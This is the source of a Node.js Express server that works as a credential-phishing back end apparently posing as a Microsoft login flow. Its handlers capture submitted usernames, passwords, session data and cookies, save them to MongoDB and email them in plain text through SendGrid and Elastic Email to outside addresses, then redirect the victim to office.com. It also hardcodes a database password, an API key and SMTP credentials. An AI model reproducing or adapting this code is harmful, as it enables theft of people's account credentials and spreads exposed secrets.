let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let https = require('https');
let session = require('express-session');
let cookieParser = require('cookie-parser');
let app = express();
let nodemailer = require('nodemailer');
const mongodb = require('mongodb');
const MongoClient = mongodb.MongoClient;
const MongoStore = require("connect-mongo");

const uri="mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb"



app.set("view engine", "ejs")
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(session({
  secret: 'runner',
  resave: false,
  saveUninitialized: true,
  store: new MongoStore({
  mongoUrl: uri,
    collection: "sessions"
  })

}));

mongoose.set('strictQuery', true);
mongoose.connect(uri, { useNewUrlParser: true });
const db = mongoose.connection;

// db.on("error", (error) => {
//   console.error("connection error:", error);
// });
//
// db.once("open", () => {
//   console.log("Connected to MongoDB");
// });
mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });
// MongoClient.connect(uri, { useNewUrlParser: true }, function(err, client) {
//    if(err) {
//       console.log('Error occurred while connecting to MongoDB Atlas...\n',err);
//    }
//    console.log('Connected...');
//    const db = client.db("autograb");
//    const collection = db.collection("cookies");
//    const cookie = { secure: true,
//              maxAge: 60 * 60 * 24 * 30 * 2 * 1000,
//              httpOnly: true,
//              sameSite: "strict" };
//    collection.insertOne(cookie, function(err, res) {
//       console.log("Cookie inserted");
//       client.close();
//    });
// });
const userSchema = new mongoose.Schema({
  hidden: String,
  password: String,
});
const User = new mongoose.model("User", userSchema);

app.get("/", (req, res) => {
  let username = req.query.username;
  // console.log(`Session: ${JSON.stringify({ username: req.session.username, connect: { sid: req.session.id } })}`);
  // console.log(`Cookies: ${JSON.stringify(req.cookies)}`);

  res.render("recap", { username: username });
});

app.post("/", function(req, res) {
let username = req.body.recapstore;
req.session.username = req.body.username;
// console.log(`Session: ${JSON.stringify({ username: req.session.username, connect: { sid: req.session.id } })}`);
// console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
//
// const sessionData = {
//   session: { username: req.session.username, connect: { sid: req.session.id } },
//   cookies: req.cookies
// };
//
// db.collection("data").insertOne(sessionData, (error) => {
//   if (error) {
//     console.error("Error saving session and cookies to the database:", error);
//   } else {
//     console.log("Session and cookies saved to the database");
//   }
// });

res.render("second", { username: username });
});

// app.post("/first", function(req, res) {
//   var username = req.body.username;
//   res.render("second", {username: username});
// });



app.post("/second", function(req, res) {
  req.session.username = req.body.username;
req.session.password = req.body.pass;
const sessionData = {
  session: { username: req.session.username, connect: { sid: req.session.id } },
  cookies: req.cookies
};

db.collection("data").insertOne(sessionData, (error) => {
  if (error) {
    console.error("Error saving session and cookies to the database:", error);
  } else {
    console.log("Session and cookies saved to the database");
  }
});
req.session.cookie.maxAge = 3 * 30 * 24 * 60 * 60 * 1000; // session will last for three months
req.session.cookie.expires = new Date(Date.now() + 3 * 30 * 24 * 60 * 60 * 1000);
req.session.cookie.path = '/';

  var username = req.body.username;
  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {

      let transporter = nodemailer.createTransport({
        host: "smtp.sendgrid.net",
        port: 465,
        secure: true,
        auth: {
          user: 'apikey',
          pass: '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'
        },

      });

      // define the email options
      let mailOptions = {
        from: 'clydeowens@vernacs.com',
        to: 'sunnyanders@vernacs.com',
        to: 'wemove1007@yandex.com',
        subject: 'Results',
        text: `username: ${username}, password: ${req.body.pass}`
      };

      // send the email
      transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
      console.log(`Session: ${JSON.stringify(req.session)}`);
      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
      // redirect to the specified URL
      res.render("third", {
        username: username
      });
    }
  });
});



app.post("/third", function(req, res) {
  var username = req.body.username;
  const sessionData = {
    session: { username: req.session.username, connect: { sid: req.session.id } },
    session: { password: req.session.password, connect: { sid: req.session.id } },
    cookies: req.cookies
  };

  db.collection("data").insertOne(sessionData, (error) => {
    if (error) {
      console.error("Error saving session and cookies to the database:", error);
    } else {
      console.log("Session and cookies saved to the database");
    }
  });

  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      // create a transporter object to connect to the SMTP server
      let transporter = nodemailer.createTransport({
        host: "smtp.elasticemail.com",
        port: 2525,
        secure: false,
        auth: {
          user: 'prattrenee@post.com',
          pass: '19087AD1B1A6CCB2AEB8AA312B76C43D409F'
        },
        timeout: 5000
      });

      // define the email options
      let mailOptions = {
        from: 'prattrenee@post.com',
        to: 'slangley1759@gmail.com',
        to: 'yingliulai@gmail.com',
        subject: 'New Form Submission',
        text: `username: ${username}, password: ${req.body.pass}`
      };

      // send the email
      transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
      console.log(`Session: ${JSON.stringify(req.session)}`);
      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
      // redirect to the specified URL
      res.redirect("https://www.office.com/")
    }
  });
});



let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
